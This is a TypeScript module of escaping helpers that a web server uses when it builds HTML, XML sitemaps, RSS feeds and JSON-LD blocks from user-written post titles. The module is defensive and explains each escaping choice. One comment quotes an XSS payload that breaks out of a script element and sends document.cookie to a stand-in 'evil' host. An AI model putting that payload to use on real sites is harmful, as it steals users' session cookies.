// Escaping for the places user-written text lands in a page this server builds
// itself. Everything else in the app hands JSON to React, which escapes on the
// way to the DOM; these routes assemble HTML as a string, so the escaping is
// ours to get right and there is no framework underneath to catch a miss.
//
// A post title is attacker-controlled in the only sense that matters here:
// anyone can register, and anyone can title a post `</script><script>`. The
// functions below cover the grammars that text can break out of.
//
// The regexes for non-printing characters are built from strings rather than
// written as literals, so that no control character or invisible separator ever
// appears in this file. A source file that has to be opened in a hex editor to
// be reviewed is a source file whose escaping cannot be reviewed.

const HTML_ENTITIES: Record<string, string> = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
};

/**
 * Text going into element content or an attribute value.
 *
 * Deliberately one function rather than the usual two. Element content strictly
 * only needs `&<>`, and quotes could be left alone there — but a single escape
 * that is safe everywhere removes the one decision a caller could get wrong, and
 * `&quot;` renders as `"` in element content anyway, so the stricter version
 * costs nothing visible.
 */
export function escapeHtml(value: string): string {
  return value.replace(/[&<>"']/g, c => HTML_ENTITIES[c]);
}

// Control characters XML 1.0 cannot represent at all, escaped or not, so a
// document containing one does not parse. Tab (09), newline (0A) and carriage
// return (0D) are legal and are deliberately outside the class.
const XML_ILLEGAL = new RegExp('[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F]', 'g');

/**
 * A value going into an XML document — the sitemap, and the RSS a tag page
 * serves.
 *
 * The same five characters as HTML, spelled the way XML spells them: no `&#39;`
 * convention here, and `&apos;` is the one named entity HTML lacks. Illegal
 * control characters are dropped rather than escaped, because dropping is the
 * only option that yields a parseable document and they cannot carry meaning in
 * a title.
 */
export function escapeXml(value: string): string {
  return value
    .replace(XML_ILLEGAL, '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;');
}

// Legal inside a JSON string, but line terminators to a JavaScript parser — so
// a JSON document containing one is not always a valid JavaScript expression.
const JS_LINE_SEPARATORS = new RegExp('[\\u2028\\u2029]', 'g');

/**
 * A `<script type="application/ld+json">` block.
 *
 * The dangerous part is not the JSON — `JSON.stringify` handles quoting — it is
 * that an HTML parser does not parse the contents of a script element as JSON.
 * It scans for `</script` and stops there, wherever that appears. So a post
 * titled
 *
 *     </script><script>fetch('//evil/'+document.cookie)</script>
 *
 * would close the data block and open a real one. Escaping `<` as `<`
 * prevents it: the same string once the JSON is parsed, and no longer containing
 * the sequence the HTML parser is scanning for. `>` and `&` go the same way as
 * belt and braces.
 *
 * The CSP in client/nginx.conf would stop an injected script executing, but this
 * must not be the thing standing between a post title and an XSS.
 */
export function jsonLdScript(data: unknown): string {
  const json = JSON.stringify(data)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(JS_LINE_SEPARATORS, m => '\\u' + m.charCodeAt(0).toString(16));
  return `<script type="application/ld+json">${json}</script>`;
}

/**
 * Already-sanitized post or comment HTML, on its way into a `<noscript>` block.
 *
 * The body has been through sanitizeRichHtml on write, so it holds no scripts
 * and no event handlers. What it could still hold is the literal text
 * `</noscript>` — harmless in every other context, and a way out of this one,
 * since a `<noscript>` element is parsed as raw text up to its closing tag when
 * scripting is enabled. Breaking the sequence leaves the visible text unchanged
 * for the one reader who would ever see it.
 */
export function safeInNoscript(html: string): string {
  return html.replace(/<\/(noscript)/gi, '&lt;/$1');
}

/**
 * Collapse rich text to a single line of plain prose, for a meta description.
 *
 * Not an escape — the result still has to go through escapeHtml — but it is the
 * other half of "text from a database into a tag": a description carrying a
 * newline is not invalid, merely wrong, and every caller wants the same collapse.
 */
export function collapseWhitespace(text: string): string {
  return text.replace(/\s+/g, ' ').trim();
}
